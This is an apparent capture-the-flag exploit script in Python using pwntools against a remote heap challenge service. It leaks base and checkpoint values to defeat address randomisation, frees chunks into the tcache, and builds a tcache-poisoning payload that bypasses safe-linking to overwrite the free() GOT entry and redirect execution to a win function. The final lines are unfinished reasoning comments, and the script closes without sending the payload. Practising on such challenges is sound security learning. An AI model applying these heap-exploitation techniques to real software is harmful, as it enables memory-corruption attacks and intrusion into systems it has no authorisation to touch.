from pwn import *

p = remote("kubenode.mctf.io", 31098)

def recv_menu():
    return p.recvuntil(b'> ')

def register(idx, count, size, data):
    p.sendline(b'1')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Item count: ')
    p.sendline(str(count).encode())
    p.recvuntil(b'Item size (bytes): ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data:\n')
    p.send(data)
    recv_menu()

def view(idx):
    p.sendline(b'2')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    res = p.recvuntil(b'\n\n===', drop=True)
    recv_menu()
    return res

def inspect(idx):
    p.sendline(b'3')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Validator    : ')
    validator = int(p.recvline().strip(), 16)
    p.recvuntil(b'Checkpoint   : ')
    checkpoint = int(p.recvline().strip(), 16)
    recv_menu()
    return validator, checkpoint

def delete(idx):
    p.sendline(b'4')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    recv_menu()

recv_menu()
register(0, 1, 16, b'A'*16)
register(1, 1, 16, b'B'*16)
register(2, 1, 16, b'C'*16)

val, chk0 = inspect(0)
_, chk1 = inspect(1)

base_addr = val - 0x136c
win_func = base_addr + 0x14a8
print(f"Base: {hex(base_addr)}, Win: {hex(win_func)}")

delete(2)
delete(1)

delete(0)
# Tcache: 0 -> 1 -> 2

payload = b'A' * 24 # Fill chunk 0 data
payload += p64(0x21) # Chunk 1 size
free_got = base_addr + 0x35f8
fd = free_got ^ (chk1 >> 12)
payload += p64(fd) # Overwrite fd

# To prevent the program from crashing, maybe we shouldn't send 65536 bytes?
# Yes! `read` can read less if we just send less and don't close the socket!
# Wait, if we send less, `read` will just wait for more!
# Unless we send EOF? No, TCP socket.
# The `read` function in the loop:
# 1430: call read
# 143a: add %rax, %rbx
# 143d: cmp %rbp, %rbx
# 1440: jb 1421
# It WILL loop until 65536 bytes are read!
# So we MUST send 65536 bytes. But what if we overwrite chunk 2? We need to keep its size valid maybe?
# Or just don't overwrite it, we can pad with zeros!
p.close()
